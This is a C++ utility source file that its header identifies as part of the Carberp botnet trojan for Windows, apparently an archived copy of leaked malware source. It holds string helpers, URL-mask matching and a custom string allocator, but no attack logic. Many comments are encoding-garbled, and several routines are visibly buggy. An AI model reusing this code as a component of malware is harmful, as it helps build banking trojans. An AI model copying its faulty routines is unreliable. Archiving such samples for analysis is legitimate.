/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include <windows.h>
#include "Memory.h"
#include "GetApi.h"
#include "Strings.h"

void DbgMsg(char *file, int line, char *msg, ...)
{
	char *buff  = (char*)MemAlloc( 1024 );
	char *obuff = (char*)MemAlloc( 1024 );
	va_list mylist;

	va_start(mylist, msg);
	wvsprintfA(buff, msg, mylist);	
	va_end(mylist);

	wsprintfA(obuff, "%s(%d) : %s", file, line, buff);

	OutputDebugStringA(obuff);
}
void DbgMsgW(WCHAR *file, int line, WCHAR *msg, ...)
{
	WCHAR *buff  = (WCHAR*)MemAlloc( 1024 );
	WCHAR *obuff = (WCHAR*)MemAlloc( 1024 );
	va_list mylist;

	va_start(mylist, msg);
	wvsprintfW(buff, msg, mylist);	
	va_end(mylist);

	wsprintfW(obuff, L"%s(%d) : %s", file, line, buff);

	OutputDebugStringW(obuff);
}

void AlertError( LPTSTR lpszFunction ) 
{ 
    LPVOID lpMsgBuf;
    LPVOID lpDisplayBuf;
    DWORD dw = GetLastError(); 

    FormatMessage(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | 
        FORMAT_MESSAGE_FROM_SYSTEM |
        FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        dw,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPTSTR) &lpMsgBuf,
        0, NULL );

    // Display the error message and exit the process

    lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT, 
        (lstrlen((LPCTSTR)lpMsgBuf)+lstrlen((LPCTSTR)lpszFunction)+40)*sizeof(TCHAR)); 
    wsprintfA((LPTSTR)lpDisplayBuf, "%s failed with error %d: %s", lpszFunction, dw, lpMsgBuf); 
    OutputDebugStringA( (char*)lpDisplayBuf ); 

    LocalFree(lpMsgBuf);
    LocalFree(lpDisplayBuf);
}


DWORD WINAPI m_lstrncmp( const char *szstr1, const char *szstr2, int nlen )
{
	if ( !szstr1 || !szstr2 )
	{
		return -1;
	}

	DWORD dwReturn;

	__asm
	{
		pushad
		mov		esi,[szstr1]
		mov		edi,[szstr2]
		mov		ecx,[nlen]
		repe	cmpsb
		jz		__true
	__false:
		xor		eax,eax
		inc		eax
		jmp		__to_exit
	__true:
		cmp byte ptr [edi],0
		jnz		__false	
		xor		eax,eax
	__to_exit:
		mov		[dwReturn],eax
		popad
	} 	
	
	return dwReturn;
} 

DWORD WINAPI m_lstrlen( char *szPointer )
{
	if ( !szPointer )
	{
		return 0;
	}

	DWORD iCounter;

	__asm
	{
		pushad
		xor		ecx,ecx
		mov		esi,[szPointer]
	__again:
		lodsb
		test	al,al
		jz		__to_exit
		inc		ecx
		jmp		__again
	__to_exit:
		mov		[iCounter], ecx
		popad
	}

	return iCounter;
} 


void WINAPI m_lstrcat( char *szBuf, const char *szStr )
{
	if ( !szBuf || !szStr )
	{
		return;
	}

	__asm
	{
		pushad
		mov		esi,[szBuf]
	__again:
		lodsb
		test	al,al
		jnz		__again

		dec		esi
		xchg	esi,edi
		mov		esi,[szStr]
	__copy:
		lodsb
		test	al,al
		stosb
		jnz		__copy
		popad
	} 
} 

void WINAPI m_lwcscat( WCHAR *szBuf, const WCHAR *szStr )
{
	if ( !szBuf || !szStr )
	{
		return;
	}

	__asm
	{
		pushad
		mov		esi,[szBuf]
	__again:
		lodsb
		test	al,al
		jnz		__again

		dec		esi
		xchg	esi,edi
		mov		esi,[szStr]
	__copy:
		lodsb
		test	al,al
		stosb
		jnz		__copy
		popad
	} 
} 


DWORD WINAPI m_lstrcmp( const char *szStr1, const char *szStr2 )
{
	if ( !szStr1 || szStr2 )
	{
		return -1;
	}

	DWORD dwReturn;

	__asm
	{
		pushad
		mov		esi,[szStr1]
		mov		edi,[szStr2]
	__copy:
		cmp byte ptr [esi],0
		jz		__true
		cmpsb
		jz		__copy
	__false:
		xor		eax,eax
		inc		eax
		jmp		__to_exit
	__true:
		cmp byte ptr [edi],0
		jnz		__false	
		xor		eax,eax
	__to_exit:
		mov		[dwReturn],eax
		popad
	} 
	
	return dwReturn;
} 


void WINAPI m_lstrcpy( char *szBuf, const char *szStr )
{
	if ( !szBuf || !szStr )
	{
		return;
	}

	__asm
	{
		pushad
		mov		esi,[szStr]
		mov		edi,[szBuf]
	__copy:
		lodsb
		test	al,al
		stosb
		jnz		__copy
		popad
	} 
} 


void WINAPI m_lstrlwr( char *str )
{
	if ( !str )
	{
		return;
	}

	int n = m_lstrlen( str );
	
	for(int i = 0; i < n; i++ )
	{
		if ( str[i] >= 65 && str[i] <= 90 )
		{
			str[i] += 32;
		}
	}
}


bool WINAPI m_lstrncpy( char *pString_src, const char *pString_dst, DWORD len )
{
	if ( !pString_dst || !pString_src )
	{
		return false;
	}

	if ( m_lstrlen( (char*)pString_dst ) < len )
	{
		len = m_lstrlen( (char*)pString_dst );
	}

	for ( DWORD i = 0; i < len; i++ )
	{
		pString_src[i] = pString_dst[i];
	}

	return true;
}


char * WINAPI m_strtok_s( char *String, const char *Control, char **Context )
{
    char *token;
    const char *ctl;

    if ( !String )
    {
        String = *Context;
    }

    for ( ; *String != 0 ; String++ )
    {
        for ( ctl = Control; *ctl != 0 && *ctl != *String; ctl++ );

        if ( *ctl == 0 )
        {
            break;
        }
    }
    
	token = String;

    for ( ; *String != 0 ; String++)
    {
        for ( ctl = Control; *ctl != 0 && *ctl != *String; ctl++ );

        if ( *ctl != 0 )
        {
            *String++ = 0;
            break;
        }
    }
    
	*Context = String;

    if ( token == String )
    {
        return NULL;
    }
    else
    {
        return token;
    }
}


int WINAPI m_isspace( char x )
{
	return ( x == ' ' );
}


int WINAPI  m_isdigit( char x )
{
	return ( ( x >= '0' ) && ( x <= '9' ) );
}


long WINAPI m_atol( const char *nptr )
{
	if ( !nptr )
	{
		return 0;
	}

	int c;              
	long total;         
	int sign;           
	
	while ( m_isspace( (int)(unsigned char)*nptr ) )
	{
		++nptr;
	}
	
	c = (int)(unsigned char)*nptr++;

	sign = c;

	if ( c == '-' || c == '+' )
	{
		c = (int)(unsigned char)*nptr++;
	}
	
	total = 0;
	
	while ( m_isdigit( c ) )
	{
		total = 10 * total + ( c - '0' );     
		c = (int)(unsigned char)*nptr++;    
	}
	
	if ( sign == '-' )
	{
		return -total;
	}
	else
	{
		return total;   
	}
}


int m_atoi( const char *nptr )
{
	return (int)m_atol(nptr);
}

char * WINAPI m_strstr( const char * _Str, const char * _SubStr )
{
	if( !_Str || !_SubStr )
	{
		return NULL;
	}

	int f = 1;
	int s;

	size_t slen  = m_lstrlen( (char*)_Str );
	size_t sslen = m_lstrlen( (char*)_SubStr );

	for ( char* p = (char*)_Str; f;  p++ )
	{
		char* k = (char*)_SubStr;

		if ( *p == 0 )
		{
			break;
		}

		if ( *k == 0 )
		{
			break;
		}

		if ( *p == *k )
		{
			char* p1 = p;
			char* k1 = k;

			s = 0;

			for( ; true;  )
			{
				if( *p1 == *k1 )
				{
					s++;
				}

				if( s == (int)sslen )
				{
					return p;
				}

				if( *p1 != *k1 )
				{
					break;
				}

				p1++;
				k1++;
			}

		}
	}

	return NULL;
}

int WINAPI m_istrstr( const char * _Str, const char * _SubStr )
{
	// ������� ���� ��������� _SubStr � ������ _Str
	if( !_Str || !_SubStr )
		return -1;

 //	DWORD f = 1;
	DWORD s;
	DWORD j = 0;

	size_t slen  = m_lstrlen( (char*)_Str );
	size_t sslen = m_lstrlen( (char*)_SubStr );

	// �������� ������ �� ����� ������
	char *p = (char*)_Str;
	while (*p != 0)
	{
		char* k = (char*)_SubStr;

		// ���������� ������ �������
		if ( *p == *k )
		{
			char* p1 = p;
			char* k1 = k;

			s = 0;
            // ���������� ���������� ����������
			while(*p1 != 0 && *k1 != 0)
			{
				if (*p1 == *k1)
				{
					s++;
					if (s == 3)
					{
						s = s;
					}
                }
				else
					break;
				if (s == (DWORD)sslen)
					return j;

				p1++;
				k1++;
			}
		}

		// ������� ���������
		p++;
		j++;
	}
	return -1;
}

char* WINAPI ToAnsiEx( LPCWSTR String, DWORD dwSize )
{
	if ( !String) return NULL;

	int l = (int)pWideCharToMultiByte ( CP_ACP, 0, String, dwSize, 0, 0, NULL, NULL);
	char *r = (char*)MemAlloc( l + 1 ); 

	pWideCharToMultiByte ( 1251, 0, String, dwSize, r, l, NULL, NULL );

	return r;
}

char* WINAPI ToAnsi( LPCWSTR String )
{
	if ( !String) return NULL;

	int l = (int)pWideCharToMultiByte ( CP_ACP, 0, String, -1, 0, 0, NULL, NULL);
	char *r = (char*)MemAlloc( l + 1 ); 

	pWideCharToMultiByte ( 1251, 0, String, -1, r, l, NULL, NULL);

	return r;
}

WCHAR *AnsiToUnicode( char *AnsiString, DWORD dwStrLen )
{
	if ( !AnsiString )
	{
		return NULL;
	}

	WCHAR *pszwString = (WCHAR *)MemAlloc(  dwStrLen + 1 );

	if ( pszwString == NULL )
	{
		return NULL;
	}

	pMultiByteToWideChar( CP_ACP, 0, AnsiString, dwStrLen, (LPWSTR)pszwString, dwStrLen + 1 );

	return  pszwString;
}


DWORD WINAPI m_wcslen( const wchar_t *String )
{
	if ( !String )
	{
		return 0;
	}

	wchar_t* p = (wchar_t *)String;

	for( ; *p != 0; )
	{
		p++;
	}

	return p - String;
}


wchar_t *m_wcsncpy( wchar_t *dest, wchar_t *src, unsigned long n )
{
	if ( !dest || !src )
	{
		return NULL;
	}

	for ( ULONG i = 0; i < n; i++ ) 
    {
	   dest[i] = src[i];
    }

    return dest;
}

bool m_wcsncmp( WCHAR *s1, WCHAR *s2, size_t iMaxLen )
{
	if ( !s1 || !s2 )
	{
		return false;
	}

	for ( size_t i = 0; i < iMaxLen; i++ )
	{
		if ( !s1[i] || !s2[i] )
		{
			return true;
		}

		if ( s1[i] != s2[i] )
		{
			return true;
		}
	}

	return false;
}

wchar_t *m_wcslwr( wchar_t *Str )
{
	if ( !Str )
	{
		return NULL;
	}

    wchar_t *Pos = Str;

    for ( ; Str <= ( Pos + m_wcslen( Pos ) ); Str++ )
    {		
        if ( ( *Str >= 'A' ) && ( *Str <= 'Z' ) ) 
		{
			*Str = *Str + ('a'-'A');
		}
    }

    return Pos;
}

int WINAPI UrlEncode( char *pszDestiny, char *pszSource )
{
	int nLength;
	char *pDest;
	char *pSource;
	char Char;

	nLength = 0;

	if ( pszDestiny )
	{
		if ( pszSource )
		{
			pDest   = pszDestiny;
			pSource = pszSource;
			Char	= *pszSource;

			do
			{
				if ( Char )
				{
					if ( Char == 32 )
					{
						*pDest = 43;
						++nLength;
					}
					else
					{
						if ( Char >= 48 && Char <= 57 || Char >= 65 && Char <= 90 || Char >= 97 && Char <= 122 || Char == 95 )
						{
						  *pDest = Char;
						  ++nLength;
						}
						else
						{
						  *pDest++ = 37;
						  wsprintf(pDest++, "%02X", (unsigned __int8)Char);
						  nLength += 3;
						}
					}
				}
				else
				{
				  *pDest = 0;
				}
				++pDest;
				++pSource;
				Char = *pSource;
			} while ( Char );
		}
	}
	
	return nLength;
}

/*
bool WildCmp( char *Buffer, char *Mask, LPDWORD dwStart, LPDWORD dwEnd, LPDWORD dwLen )
{
	char *TempMask = (char*)MemAlloc( m_lstrlen( Mask ) + 1 );

	if ( TempMask == NULL )
	{
		return false;
	}

	m_memcpy( TempMask, Mask, m_lstrlen( Mask ) );

	char *Args[255];

	DWORD ArgsCount = 0;

	char *Context;

	char *p = m_strtok_s( TempMask, "*", &Context );

	DWORD i = 0;
	
	for ( i = 0; p; p = m_strtok_s( NULL, "*", &Context ), i++ )
	{
		Args[i] = p;
		ArgsCount++;		
	}		

	if ( ArgsCount == 1 ) //����� ����
	{
		DWORD Start = m_istrstr( Buffer, Mask );

		if ( Start != -1 )
		{
			*dwStart = Start;
			*dwEnd   = Start + m_lstrlen( Mask );
			*dwLen	 = m_lstrlen( Mask );

			return true;
		}
	}

	DWORD Start = m_istrstr( Buffer, Args[0] );

	if ( Start != -1 )
	{
		DWORD dwJump = 0;
		DWORD End    = Start;

		i = 1;

		while ( ( dwJump = m_istrstr( Buffer + End, Args[i] ) ) != -1 )
		{
			End += dwJump;
			i++;
		}

		End += m_lstrlen( Args[ i - 1 ] );

		if ( ArgsCount != i )
		{
			return false;
		}

		*dwStart = Start;
		*dwEnd	 = End;
		*dwLen   = End - Start;

		return true;
	}

	return false;
}*/


bool WildCmp( char *Buffer, char *Mask, LPDWORD dwStart, LPDWORD dwEnd, LPDWORD dwLen )
{
	// ������� ���� � ������ ���������.
	// ��������� ����� ��������� ������, ����� *
	if ( !Buffer || !Mask )
		return false;

	char *TempMaskBuf = StrNew(0, Mask);
	char *TempMask = TempMaskBuf;

	if ( TempMask == NULL )
		return false;


	char **Args = (char**)MemAlloc( sizeof( char* ) * 255 );

	if (Args == NULL)
	{
		return false;
        StrFree(TempMaskBuf);
	}

	// ��������� ��������� �� ��������� ����� *
	DWORD ArgsCount = 0;

	char *Context;

	char *p = m_strtok_s( TempMask, "*", &Context );

	DWORD i = 0;
	
	for ( i = 0; p; p = m_strtok_s( NULL, "*", &Context ), i++ )
	{
		Args[i] = p;
		ArgsCount++;
	}		


	if ( ArgsCount == 1 )
	{
		//  ����� ���, ������ ���� ��������� ���������
		DWORD Start = m_istrstr( Buffer, Mask );

		if ( Start != -1 )
		{
			*dwStart = Start;
			*dwEnd   = Start + m_lstrlen( Mask );
			*dwLen	 = m_lstrlen( Mask );

			MemFree(Args);
			StrFree(TempMaskBuf);
			return true;
		}
	}

    // ���������� � ������ �����

	int Start = m_istrstr( Buffer, Args[0] );

	if ( Start != -1 )
	{
		DWORD dwJump = 0;
		DWORD End    = Start;

		i = 1;

		while ( ( dwJump = m_istrstr( Buffer + End, Args[i] ) ) != -1 )
		{
			End += dwJump;
			i++;
		}

		End += m_lstrlen( Args[ i - 1 ] );

		if ( ArgsCount != i )
		{
			StrFree(TempMaskBuf);
            MemFree(Args);
			return false;
		}

		*dwStart = Start;
		*dwEnd	 = End;
		*dwLen   = End - Start;

		StrFree(TempMaskBuf);
		MemFree( Args );
		return true;
	}

	StrFree(TempMaskBuf);
	MemFree(Args);
	return false;
}

bool CompareUrl( char *MaskUrl, char *Url )
{
	DWORD dwStart = 0;
	DWORD dwEnd	  = 0;
	DWORD dwLen	  = 0;

	if ( WildCmp( Url, MaskUrl, &dwStart, &dwEnd, &dwLen ) )
	{
		return true;
	}

	return false;
}

//-----------------------------------------------------------------------------

// ������ ��������������� ��������� ������
BYTE StrHeaderSize = 2*sizeof(DWORD);

// �������� �� ��������� ������
BYTE StrSignatereDelta = StrHeaderSize;
BYTE StrSignatureSize = sizeof(DWORD);

// �������� �� ������� ������
BYTE StrLengthDelta = sizeof(DWORD);

// ��������� ������
DWORD StrSignature = (DWORD)"SMST";


//------------------------------------------------------------------------------

DWORD CalcStrLength(char *Buf)
{
	// ������� ����������� ����� ������ ������� �� ��� � �������
	// �������� �������
	DWORD Counter;

	__asm
	{
		pushad
		xor		ecx, ecx
		mov		esi, [Buf]
	__again:
		lodsb
		test	al,al
		jz		__to_exit
		inc		ecx
		jmp		__again
	__to_exit:
		mov		[Counter], ecx
		popad
	}

	return Counter;
}
//------------------------------------------------------------------------------

PCHAR StrNew(DWORD Count, PCHAR Str...)
{
 // ������� ������ ������ ��������� ��������� �����
 PCHAR Result = NULL;
 PCHAR *First = &Str;

 StrConcatArguments(Result, Count, First);

 return Result;
}

PCHAR StrNew(PCHAR Source, DWORD CopySize)
{
 //  ������� ����� ������ �� ������ Source (������ ������� ������ Source)
    //  ������ �������� ������ �������������

 if (Source == NULL)
  return NULL;

 DWORD Size;
 if (CopySize != 0)
  Size = CopySize;
 else
  Size = StrCalcLength(Source);

 PCHAR Str = StrAlloc(Size);
 if (Str != NULL)
 {
  m_memcpy(Str, Source, Size);
  // ���������� ����� ������
  *(DWORD *)(Str - StrLengthDelta) = Size;
 }

 return Str;
}
/*
PCHAR StrNew(DWORD Len, PCHAR Source)
{
	// ������� ������ �������� Len, ���� ������� ������ �������� Source �� �� ��
	// ����� ����������� Len ��������.
    // � ������ ���� Le = 0 ���������� ����� ������ �� ������ ���������

	// ����� ������ ����� �� 3-� ������:
	// [(DWORD) ��������� ������][(DWORD) ������ ������][������ ������]

	DWORD SourceLen = CalcStrLength(Source);

	if (Len == 0)
		Len = SourceLen;

	PCHAR Str = (PCHAR)MemAlloc(Len + StrHeaderSize + 1);
	if (Str == NULL)
		return NULL;
	// ���������� ��������� ������
	*(DWORD*)Str = StrSignature;
	Str += StrSignatureSize;

	// ���������� ������ ������
	*(DWORD*)Str = Len;
	Str += StrLengthDelta;

	// ������ ����������� ����
	*(Str + Len) = 0;

	if (Source == NULL)
		*Str = 0;
	else
	{
		// �������� ������
		DWORD CopySize = Len;
		if (SourceLen < CopySize)
			CopySize = SourceLen;
		if (CopySize != 0)
		{
			m_memcpy(Str, Source, CopySize);
			if (CopySize < Len)
            	*(Str + CopySize + 1) = 0;
		}

	}

    return Str;
}*/
//------------------------------------------------------------------------------


void StrFree(PCHAR Str)
{
    // ���������� ������.
	// �����!!! ������ ������ ���� ������� � ������� ������� StrNew

	Str -= StrHeaderSize;

	// ��������� ���� �� ��� ������
	if (*(DWORD*)Str != StrSignature)
		return;

    MemFree(Str);
}
//------------------------------------------------------------------------------


DWORD StrLength(PCHAR Str)
{
	// ������� ���������� ����� ������.
	// ���� ������ ����������� � ������� ������� StrNew �� ������
	// ���������� �� ��������� ������ � ��������� ������ ������ �������������.

	if (Str == NULL)
		return 0;
	try
	{
		PCHAR Temp = Str - StrHeaderSize;

		if (*(DWORD*)Temp == StrSignature)
		{
		  Temp += StrSignatureSize;
		  return *(DWORD*)Temp;
		}
		else
			return CalcStrLength(Str);
	}
	catch (...)
	{
		// ���� ������ �� ����� �� ����������� � ������� StrNew, �� � ��������
		// ������ ��������� ����� ���������� ������ ��������� � ������
    	return CalcStrLength(Str);
    }

}
//------------------------------------------------------------------------------


void StrSetLength(PCHAR &Str, DWORD NewLength)
{
	// �������� ������ ������
	// �����!!! ������� �������� �� �������� ������� ������� �������� StrNew

	// ��� ��������������� ����� ������, �� �������� ����� ������ � ������
	// �������� � ��������� � �� ������.

	if (Str == NULL)
		return;

	if (*(DWORD*)(Str - StrHeaderSize) != StrSignature)
		return;

	PCHAR New = StrNew(NewLength, Str);
	StrFree(Str);
	Str = New;
}
//------------------------------------------------------------------------------

bool StrIsEmpty(PCHAR Str)
{
	// ������� ���������� ������ ���� �� ����� ������� ��������� ����
	// ������ ������
	return (Str == NULL) || (StrLength(Str) == 0);
}
//------------------------------------------------------------------------------
